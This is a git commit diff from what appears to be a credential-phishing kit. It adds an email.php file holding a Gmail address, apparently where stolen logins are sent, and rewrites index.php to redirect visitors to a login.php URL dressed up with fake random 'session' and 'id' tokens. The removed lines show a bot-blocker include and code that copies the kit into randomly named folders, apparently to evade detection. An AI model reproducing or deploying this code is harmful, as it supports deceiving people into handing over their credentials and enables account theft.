88598731c4bffc4bf81f6505b3333763dc9b04aa
offbo <100291414+offbo@users.noreply.github.com>
2022-02-23 15:37:30 +0200

    Add files via upload

---
+++ email.php
@@ -0,0 +1,5 @@
+<?
+
+$email = "rogastevet@gmail.com";
+
+?>
--- index.php
+++ index.php
@@ -1,32 +1,8 @@
 <?php
+	$praga=rand();
+	$praga=md5($praga);
 
-include('blocker.php');
+	header("location: login.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
 
-$random = rand(0,100000000000);
-$dst    = substr(md5($random), 0, 1000000000);
-
-//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\
-
-function recurse_copy($src,$dst)
-{
-	$dir = opendir($src);
-	@mkdir($dst);
-	while(false !== ( $file = readdir($dir)) ) {
-		if (( $file != '.' ) && ( $file != '..' )) {
-			if ( is_dir($src . '/' . $file) ) {
-				recurse_copy($src . '/' . $file,$dst . '/' . $file);
-			}
-			else {
-				copy($src . '/' . $file,$dst . '/' . $file);
-			}
-		}
-	}
-	closedir($dir);
-}
-
-$src="Validation";
-recurse_copy( $src, $dst );
-
-header("location:".$dst."");
 
 ?>
